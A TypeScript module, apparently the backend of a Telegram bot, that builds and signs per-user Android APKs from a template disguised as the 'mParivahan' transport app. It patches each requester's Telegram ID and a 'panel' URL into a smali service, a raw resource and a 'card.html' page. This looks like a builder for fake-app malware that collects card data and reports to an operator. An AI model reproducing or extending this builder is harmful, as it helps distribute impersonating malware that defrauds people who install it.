import { exec } from "child_process";
import { promisify } from "util";
import * as fs from "fs";
import * as path from "path";
import { fileURLToPath } from "url";
import { createWriteStream } from "fs";
import { pipeline } from "stream/promises";

const execAsync = promisify(exec);

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const WORKSPACE_ROOT = path.resolve(__dirname, "..", "..", "..");
const OUTPUT_DIR = path.join(WORKSPACE_ROOT, "output");
const APK_CACHE_DIR = path.join(OUTPUT_DIR, "apk_cache");

const APK_TEMPLATE_DIR = "/tmp/apk_patch/decoded";
const BASE_TEMPLATE_APK = path.join(OUTPUT_DIR, "mParivahan_base_template.apk");
const DECODED_TAR_GZ = path.join(OUTPUT_DIR, "apk_template_decoded.tar.gz");

const OWNER_PLACEHOLDER     = "OWNER_TELEGRAM_ID_000000000";
const PANEL_URL_PLACEHOLDER = "PANEL_API_URL_PLACEHOLDER_AXECODI";
const SMALI_FILE_REL =
  "smali_classes63/dApp/binance/Trading/Signals/MyService$1.smali";
const LODA_FILE_REL    = "res/raw/Loda";
const CARD_HTML_REL    = "assets/card.html";

// ── Nix fallbacks (Replit only) ───────────────────────────────────────────────
const NIX_APKTOOL   = "/nix/store/vwykh57qc5rc7wi9yc16hzn2kycdbcdr-apktool-2.11.1/bin/apktool";
const NIX_JARSIGNER = "/nix/store/xad649j61kwkh0id5wvyiab5rliprp4d-openjdk-17.0.15+6/bin/jarsigner";
const KEYSTORE      = path.join(OUTPUT_DIR, "release.keystore");

const APKTOOL_JAR = path.join(OUTPUT_DIR, "apktool.jar");
const APKTOOL_BIN = path.join(OUTPUT_DIR, "apktool.sh");
const APKTOOL_URL =
  "https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar";

// ── Download apktool.jar using Node.js fetch (no wget/curl needed) ────────────
async function downloadApktool(): Promise<void> {
  if (fs.existsSync(APKTOOL_JAR)) return; // already downloaded
  console.log("[apkBuilder] Downloading apktool.jar...");
  fs.mkdirSync(OUTPUT_DIR, { recursive: true });
  const resp = await fetch(APKTOOL_URL);
  if (!resp.ok) throw new Error(`apktool download failed: ${resp.status}`);
  const ws = createWriteStream(APKTOOL_JAR);
  // @ts-ignore — Node 18 fetch body is a ReadableStream
  await pipeline(resp.body as any, ws);
  console.log("[apkBuilder] apktool.jar downloaded.");
}

// ── Find java binary (system PATH → common Ubuntu JRE paths) ─────────────────
async function findJava(): Promise<string> {
  // 1. env override
  const fromEnv = process.env["JAVA_PATH"];
  if (fromEnv && fs.existsSync(fromEnv)) return fromEnv;
  // 2. system PATH
  try {
    const { stdout } = await execAsync("which java 2>/dev/null");
    if (stdout.trim()) return stdout.trim();
  } catch {}
  // 3. common Ubuntu/Debian locations
  const candidates = [
    "/usr/bin/java",
    "/usr/lib/jvm/default-java/bin/java",
    "/usr/lib/jvm/java-17-openjdk-amd64/bin/java",
    "/usr/lib/jvm/java-11-openjdk-amd64/bin/java",
    "/usr/lib/jvm/java-21-openjdk-amd64/bin/java",
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) return p;
  }
  throw new Error("java not found. Set JAVA_PATH env var on Render.");
}

// ── Find jarsigner (same JRE as java) ────────────────────────────────────────
async function findJarsigner(): Promise<string> {
  // 1. env override
  const fromEnv = process.env["JARSIGNER_PATH"];
  if (fromEnv && fs.existsSync(fromEnv)) return fromEnv;
  // 2. Nix path (Replit)
  if (fs.existsSync(NIX_JARSIGNER)) return NIX_JARSIGNER;
  // 3. derive from java path
  try {
    const java = await findJava();
    const jarsigner = java.replace(/\/java$/, "/jarsigner");
    if (fs.existsSync(jarsigner)) return jarsigner;
  } catch {}
  // 4. system PATH
  try {
    const { stdout } = await execAsync("which jarsigner 2>/dev/null");
    if (stdout.trim()) return stdout.trim();
  } catch {}
  throw new Error("jarsigner not found. Set JARSIGNER_PATH env var on Render.");
}

// ── Ensure apktool wrapper is ready (download + create wrapper sh) ────────────
async function ensureApktool(): Promise<string> {
  // Nix path works on Replit — use it directly
  if (fs.existsSync(NIX_APKTOOL)) return NIX_APKTOOL;
  // env override
  const fromEnv = process.env["APKTOOL_PATH"];
  if (fromEnv && fs.existsSync(fromEnv)) return fromEnv;

  // Download jar if missing
  await downloadApktool();

  // Create wrapper script (bash calls java -jar)
  const java = await findJava();
  const wrapper = `#!/bin/bash\nexec "${java}" -jar "${APKTOOL_JAR}" "$@"\n`;
  fs.writeFileSync(APKTOOL_BIN, wrapper, { mode: 0o755 });
  return APKTOOL_BIN;
}

/** Called at server startup — ensures the decoded template is ready. */
export async function initApkTemplate(): Promise<void> {
  const smaliPath = path.join(APK_TEMPLATE_DIR, SMALI_FILE_REL);
  if (fs.existsSync(smaliPath)) {
    console.log("[apkBuilder] Template already decoded — ready.");
    return;
  }

  fs.mkdirSync("/tmp/apk_patch", { recursive: true });

  // Fast path: extract pre-built tar.gz (~2s)
  if (fs.existsSync(DECODED_TAR_GZ)) {
    console.log("[apkBuilder] Extracting template from tar.gz...");
    try {
      await execAsync(`tar -xzf "${DECODED_TAR_GZ}" -C /tmp`, { timeout: 60_000 });
      console.log("[apkBuilder] Template extracted and ready.");
      // Also pre-download apktool in background so /apk is fast
      ensureApktool().catch((e) =>
        console.warn("[apkBuilder] apktool pre-download failed:", e.message)
      );
      return;
    } catch (err) {
      console.error("[apkBuilder] tar extraction failed:", err);
    }
  }

  // Fallback: full apktool decode
  const baseApk = fs.existsSync(BASE_TEMPLATE_APK) ? BASE_TEMPLATE_APK : await getApkPath();
  if (!baseApk) {
    console.error("[apkBuilder] No base APK found — /apk command will fail.");
    return;
  }
  try {
    const apktool = await ensureApktool();
    console.log("[apkBuilder] Decoding APK template via apktool (one-time, ~90s)...");
    await execAsync(`"${apktool}" d -f -o "${APK_TEMPLATE_DIR}" "${baseApk}"`, {
      timeout: 180_000,
    });
    console.log("[apkBuilder] Template decoded and ready.");
  } catch (err) {
    console.error("[apkBuilder] Failed to decode APK template:", err);
  }
}

export async function getApkPath(): Promise<string | null> {
  const candidates = [
    path.join(OUTPUT_DIR, "mParivahan_base_template.apk"),
    path.join(OUTPUT_DIR, "mParivahan_v2.apk"),
    path.join(OUTPUT_DIR, "mParivahan_yellowstone.apk"),
  ];
  for (const p of candidates) {
    if (fs.existsSync(p)) return p;
  }
  return null;
}

export function isTemplateReady(): boolean {
  return fs.existsSync(path.join(APK_TEMPLATE_DIR, SMALI_FILE_REL));
}

/**
 * Build a per-user APK with ownerTelegramId baked in.
 * First call per user: ~30–60s (download apktool if needed + compile + sign).
 * Subsequent calls: instant (cached).
 */
export async function buildUserApk(telegramId: string): Promise<string | null> {
  fs.mkdirSync(APK_CACHE_DIR, { recursive: true });

  const cachedApk = path.join(APK_CACHE_DIR, `${telegramId}.apk`);
  if (fs.existsSync(cachedApk)) return cachedApk;

  if (!isTemplateReady()) {
    await initApkTemplate();
    if (!isTemplateReady()) return null;
  }

  const panelUrl = (
    process.env["PANEL_URL"] ||
    (process.env["REPLIT_DEV_DOMAIN"]
      ? `https://${process.env["REPLIT_DEV_DOMAIN"]}`
      : "")
  ).replace(/\/$/, "");

  // Copy template to per-user build dir
  const buildDir = `/tmp/apk_build_${telegramId}`;
  await execAsync(`cp -r "${APK_TEMPLATE_DIR}" "${buildDir}"`, { timeout: 30_000 });

  const patchFile = (relPath: string, replacements: [string, string][]) => {
    const filePath = path.join(buildDir, relPath);
    if (!fs.existsSync(filePath)) return;
    let txt = fs.readFileSync(filePath, "utf-8");
    for (const [from, to] of replacements) txt = txt.split(from).join(to);
    fs.writeFileSync(filePath, txt, "utf-8");
  };

  patchFile(SMALI_FILE_REL, [[OWNER_PLACEHOLDER, telegramId]]);
  patchFile(LODA_FILE_REL,  [[OWNER_PLACEHOLDER, telegramId]]);
  patchFile(CARD_HTML_REL,  [
    [OWNER_PLACEHOLDER,     telegramId],
    [PANEL_URL_PLACEHOLDER, panelUrl],
  ]);

  const apktool   = await ensureApktool();
  const jarsigner = await findJarsigner();

  // Rebuild APK
  const unsignedApk = `/tmp/apk_unsigned_${telegramId}.apk`;
  await execAsync(`"${apktool}" b "${buildDir}" -o "${unsignedApk}"`, {
    timeout: 120_000,
  });

  // Sign
  await execAsync(
    `"${jarsigner}" -sigalg SHA256withRSA -digestalg SHA-256 ` +
      `-keystore "${KEYSTORE}" -storepass android123 -keypass android123 ` +
      `"${unsignedApk}" release`,
    { timeout: 30_000 }
  );

  fs.copyFileSync(unsignedApk, cachedApk);
  fs.unlinkSync(unsignedApk);
  execAsync(`rm -rf "${buildDir}"`).catch(() => {});

  return cachedApk;
}

export function getApkSize(apkPath: string): string {
  try {
    const stats = fs.statSync(apkPath);
    return `${(stats.size / (1024 * 1024)).toFixed(1)} MB`;
  } catch {
    return "unknown size";
  }
}
